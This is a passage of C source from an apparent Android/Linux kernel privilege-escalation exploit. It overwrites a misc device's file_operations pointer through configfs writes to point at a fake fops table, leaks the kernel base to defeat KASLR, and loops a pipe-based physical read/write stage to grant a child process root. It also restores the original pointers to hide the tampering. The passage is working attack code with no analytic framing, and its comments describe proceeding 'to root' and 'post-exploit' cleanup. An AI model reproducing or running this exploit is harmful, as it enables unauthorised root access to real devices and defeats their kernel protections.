    configfs_read_once(fd, binwrite_target, readback, sizeof(readback));
  pr_info("cfi read ret=%zd errno=%d\n", r, errno);
  if (r != (ssize_t)sizeof(readback) ||
      memcmp(readback, payload, sizeof(payload)) != 0) {
    cfi_last_step = 3;
    cfi_last_errno = errno;
    goto fail;
  }

  uint64_t before = 0;
  ssize_t rb = configfs_read_once(fd, misc_fops, &before, sizeof(before));
  fops_before = before;
  if (rb != (ssize_t)sizeof(before) || before != fake_fops) {
    cfi_last_step = 4;
    cfi_last_errno = errno;
    goto fail;
  }

  if (!restore_slide_boot_id(fd)) {
    /* run140 proof: table-scan deref of PAC'd func ptrs crashes device.
     * KASLR leak already succeeded; restore is cosmetic /proc cleanup only.
     * Non-blocking: warn, proceed to root, fix boot_id from root post-exploit. */
    pr_warning("cfi: slide boot_id restore skipped (non-blocking); "
               "/proc boot_id will remain polluted until post-root fix\n");
    fsync(STDERR_FILENO);
    /* continue — do NOT goto fail */
  }

  if (!leak_kernel_base(fd)) {
    cfi_last_step = 9;
    cfi_last_errno = errno;
    goto fail;
  }
  pr_info("cfi: leak_kb OK → pipe physrw (attempts<=%d)\n", PIPE_MAX_ATTEMPTS);
  fsync(STDERR_FILENO);

  int installed = 0;
  pipe_stage_attempts = 0;
  for (int attempt = 0; attempt < PIPE_MAX_ATTEMPTS; attempt++) {
    pipe_stage_attempts++;
    pr_info("cfi: install_child_root attempt=%d/%d\n", attempt + 1,
            PIPE_MAX_ATTEMPTS);
    fsync(STDERR_FILENO);
    if (attempt != 0) {
      reset_pipe_attempt();
    }
    if (install_child_root(fd)) {
      installed = 1;
      break;
    }
    pr_warning("cfi: install_child_root fail attempt=%d physrw r/w=%d/%d "
               "r64/w64=%d/%d cache_gate=%d\n",
               attempt + 1, physrw_read_ok, physrw_write_ok, physrw_read64_ok,
               physrw_write64_ok, pipe_cache_gate_ok);
    fsync(STDERR_FILENO);
    if (pipe_cache_gate_ok && physrw_read_ok && physrw_write_ok &&
        physrw_read64_ok && physrw_write64_ok) {
      break;
    }
  }

  if (!installed) {
    cfi_last_step = 8;
    cfi_last_errno = errno;
    pr_error("cfi: pipe/root stage failed after %d attempts\n",
             pipe_stage_attempts);
    goto fail;
  }

  uint64_t original_fops = canon_addr(ASHMEM_FOPS);
  ssize_t restore = configfs_write_once(
      fd, misc_fops, &original_fops, sizeof(original_fops));
  if (restore != (ssize_t)sizeof(original_fops)) {
    cfi_last_step = 5;
    cfi_last_errno = errno;
    goto fail;
  }

  uint64_t after = 0;
  ssize_t ra = configfs_read_once(fd, misc_fops, &after, sizeof(after));
  fops_after = after;
  if (ra != (ssize_t)sizeof(after) || after != canon_addr(ASHMEM_FOPS)) {
    cfi_last_step = 6;
    cfi_last_errno = errno;
    goto fail;
  }

  uint64_t null_owner = 0;
  ssize_t owner =
    configfs_write_once(fd, fake_fops, &null_owner, sizeof(null_owner));
  if (close(fd) != 0) {
    pr_info("try_cfi close errno=%d (non-fatal)\n", errno);
  }
  if (owner == (ssize_t)sizeof(null_owner) &&
      restore == (ssize_t)sizeof(original_fops)) {
    cfi_last_step = 0;
    cfi_last_errno = 0;
    pr_success("【4/7 CFI验证】成功\n");
    atomic_store(&cfi_stage_done, 1);
    return 1;
  }
  cfi_last_step = 7;
  cfi_last_errno = errno;
  return 0;

fail:
  if (dirty) {
    uint64_t original_fops_fail = p0_data_alias(ASHMEM_FOPS);
    if (kaslr_done) {
      original_fops_fail = canon_addr(ASHMEM_FOPS);
    }
    configfs_write_once(
        fd, misc_fops, &original_fops_fail, sizeof(original_fops_fail));
    if (can_read_back) {
      uint64_t after_fail = 0;
      if (configfs_read_once(fd, misc_fops, &after_fail, sizeof(after_fail)) ==
          (ssize_t)sizeof(after_fail)) {
        fops_after = after_fail;
      }
    }
    uint64_t null_owner_fail = 0;
    configfs_write_once(
        fd, fake_fops, &null_owner_fail, sizeof(null_owner_fail));
  }
  if (close(fd) != 0) {
    pr_info("try_cfi fail close errno=%d (non-fatal)\n", errno);
  }
  return 0;
}
